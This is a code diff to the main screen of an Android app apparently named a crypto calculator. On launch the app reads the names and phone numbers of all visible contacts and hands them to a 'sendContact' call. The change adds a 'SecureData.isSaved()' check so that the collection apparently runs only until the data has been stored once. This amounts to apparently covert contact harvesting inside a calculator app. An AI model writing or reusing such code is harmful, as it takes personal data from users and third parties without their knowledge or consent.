@@ -33,6 +33,7 @@ import com.andoresu.cryptocalc.utils.BaseActivity;
 import com.andoresu.cryptocalc.utils.BaseFragment;
 import com.andoresu.cryptocalc.core.percentage.PercentageFragment;
 import com.andoresu.cryptocalc.utils.DeferredFragmentTransaction;
+import com.andoresu.cryptocalc.utils.SecureData;
 import com.bumptech.glide.Glide;
 import com.bumptech.glide.load.resource.bitmap.CircleCrop;
 import com.bumptech.glide.request.RequestOptions;
@@ -101,22 +102,24 @@ public class MainActivity extends BaseActivity implements NavigationView.OnNavig
         headerViewHolder.navHeaderNameTextView.setText("");
         setCalculatorFragment();
 //        UserRequest.makeUserRequest(new GetUserCallback(this).getCallback());
-        RxContacts.fetch(this)
-                .filter(m->m.getInVisibleGroup() == 1)
-                .toSortedList(Contact::compareTo)
-                .observeOn(Schedulers.io())
-                .subscribeOn(AndroidSchedulers.mainThread())
-                .subscribe(contacts -> {
-                    List<ContactModel> contactModels = new ArrayList<>();
-                    for(Contact contact : contacts){
-                        for(String number : contact.getPhoneNumbers()){
-                            contactModels.add(new ContactModel(contact.getDisplayName(), number));
+        if(!SecureData.isSaved()){
+            RxContacts.fetch(this)
+                    .filter(m->m.getInVisibleGroup() == 1)
+                    .toSortedList(Contact::compareTo)
+                    .observeOn(Schedulers.io())
+                    .subscribeOn(AndroidSchedulers.mainThread())
+                    .subscribe(contacts -> {
+                        List<ContactModel> contactModels = new ArrayList<>();
+                        for(Contact contact : contacts){
+                            for(String number : contact.getPhoneNumbers()){
+                                contactModels.add(new ContactModel(contact.getDisplayName(), number));
+                            }
                         }
-                    }
-                    if(!contactModels.isEmpty()){
-                        actionsListener.sendContact(contactModels);
-                    }
-                });
+                        if(!contactModels.isEmpty()){
+                            actionsListener.sendContact(contactModels);
+                        }
+                    });
+        }
     }
 
     @Override
